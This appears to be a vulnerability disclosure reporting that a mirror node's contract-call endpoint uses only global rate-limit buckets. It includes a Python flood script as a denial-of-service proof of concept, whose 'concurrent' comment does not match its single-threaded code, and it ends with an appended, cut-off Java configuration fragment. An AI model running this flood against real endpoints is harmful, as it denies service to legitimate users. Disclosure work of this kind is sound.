### Title
Global Rate Limiter Exhaustion by Unprivileged User (No Per-User Throttling or Request Deduplication)

### Summary
`ThrottleManagerImpl.throttle()` enforces rate limits using two globally shared Bucket4j buckets — `rateLimitBucket` and `gasLimitBucket` — with no per-user, per-IP, or per-session tracking and no request deduplication. Any unprivileged caller can flood the endpoint with identical (or varied) `ContractCallRequest` objects, each atomically consuming one rate token and a proportional number of gas tokens, exhausting both shared buckets within a single refill window and denying service to all other users.

### Finding Description
**Exact code path:**

`web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java`, `throttle()`, lines 37–48:

```java
if (!rateLimitBucket.tryConsume(1)) {                                    // line 38 — 1 global token per request
    throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
} else if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {  // line 40
    throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);
}
```

Both buckets are singleton Spring beans defined in `ThrottleConfiguration` (lines 24–45) with a single global capacity:
- `rateLimitBucket`: default 500 tokens/second, refilled greedily each second.
- `gasLimitBucket`: default 7,500,000,000 gas/second (scaled by `GAS_SCALE_FACTOR = 10_000`, so 750,000 tokens/second).

**Root cause / failed assumption:** The design assumes the aggregate request rate across all callers will stay within the bucket capacity. There is no per-caller sub-limit, no IP-based partitioning, and no deduplication of identical requests. A single caller is structurally indistinguishable from the entire legitimate user population.

**Exploit flow:**
1. Attacker crafts a `ContractCallRequest` with `gas` set to the maximum allowed value (up to `evmProperties.maxGasLimit`, validated only *after* `throttle()` returns — see `ContractController` line 41–49).
2. Attacker fires requests in a tight loop (e.g., 500 identical POST `/api/v1/contracts/call` requests within one second).
3. Each call atomically removes 1 token from `rateLimitBucket` and `scaleGas(maxGas)` tokens from `gasLimitBucket`.
4. After 500 requests the rate bucket is empty; after `750_000 / scaleGas(maxGas)` requests the gas bucket is empty.
5. All subsequent legitimate requests within that second receive `ThrottleException` (HTTP 429).

**Why existing checks are insufficient:**
- The `RequestProperties` filter chain (lines 44–48) can be configured to LOG, REJECT, or THROTTLE based on request field values (`from`, `to`, `data`, etc.), but these are static pattern matches — not per-caller rate limits — and an attacker can trivially vary field values to bypass any configured filter.
- The `restore()` method (lines 59–64) only returns gas tokens when `InvalidParametersException` is thrown post-throttle; it is never called on `ThrottleException`, so exhausted tokens are not returned to the bucket.
- There is no middleware (visible in this codebase) performing IP-level rate limiting before `throttle()` is reached.

### Impact Explanation
A single unauthenticated attacker can render the `/api/v1/contracts/call` endpoint unavailable for all legitimate users for the duration of each one-second refill window, repeating the attack continuously. Because the gas bucket refills greedily each second, the attacker must sustain only ~500 req/s (well within reach of a single machine) to keep both buckets perpetually empty. This constitutes a sustained, low-cost griefing DoS with no economic cost to the attacker and no authentication barrier.

### Likelihood Explanation
The attack requires zero privileges, zero on-chain assets, and no special knowledge beyond the public API endpoint. A single commodity machine with a basic HTTP client (e.g., `wrk`, `ab`, or a simple Python script) can sustain 500 req/s indefinitely. The attack is fully repeatable across refill windows and leaves no persistent trace beyond access logs.

### Recommendation
1. **Per-caller rate limiting**: Introduce a per-IP (or per-API-key) sub-bucket alongside the global buckets. Each caller's sub-bucket should be a fraction of the global capacity.
2. **Request deduplication (optional hardening)**: Cache a short-lived hash of recent `(from, to, data, gas)` tuples; reject or serve cached responses for duplicates within a configurable window without consuming additional tokens.
3. **Fail-open token restoration**: If `throttle()` succeeds but a downstream exception is thrown (not just `InvalidParametersException`), ensure tokens are restored via `restore()` to avoid compounding exhaustion from failed requests.
4. **Infrastructure-level rate limiting**: Deploy an API gateway or reverse proxy (e.g., nginx `limit_req`) as a first line of defense before requests reach `ThrottleManagerImpl`.

### Proof of Concept
```python
import requests, threading

URL = "http://<mirror-node-host>/api/v1/contracts/call"
PAYLOAD = {
    "from": "0x0000000000000000000000000000000000000001",
    "to":   "0x0000000000000000000000000000000000000002",
    "gas":  15000000,   # maximum gas — maximises gas token drain
    "data": "0xdeadbeef",
    "estimate": False,
    "block": "latest"
}

def flood():
    for _ in range(500):
        requests.post(URL, json=PAYLOAD)

# Launch 500 requests concurrently within one second
threads = [threading.Thread(target=flood) for _ in range(1)]
for t in threads: t.start()
for t in threads: t.join()

# All subsequent legitimate requests within this second will receive HTTP 429
resp = requests.post(URL, json=PAYLOAD)
print(resp.status_code, resp.text)
# Expected: 429 "Requests per second rate limit exceeded" or "Gas per second rate limit exceeded."
```

    @Bean(name = RATE_LIMIT_BUCKET)
    Bucket rateLimitBucket() {
        long rateLimit = throttleProperties.getRequestsPerSecond();
        final var limit = Bandwidth.builder()
                .capacity(rateLimit)
                .refillGreedy(rateLimit, Duration.ofSeconds(1))
                .build();
        return Bucket.builder().addLimit(limit).build();
    }

    @Bean(name = GAS_LIMIT_BUCKET)
    Bucket gasLimitBucket() {
        long gasLimit = throttleProperties.getGasPerSecond();
        final var limit = Bandwidth.builder()
                .capacity(gasLimit)
                .refillGreedy(gasLimit, Duration.ofSeconds(1))
                .build();
        return Bucket.builder()
                .withSynchronizationStrategy(SynchronizationStrategy.SYNCHRONIZED)
                .addLimit(limit)
                .build();
    }

    public long scaleGas(long gas) {
        if (gas <= GAS_SCALE_FACTOR) {
            return 0L;
        }
        return Math.floorDiv(gas, GAS_SCALE_FACTOR);
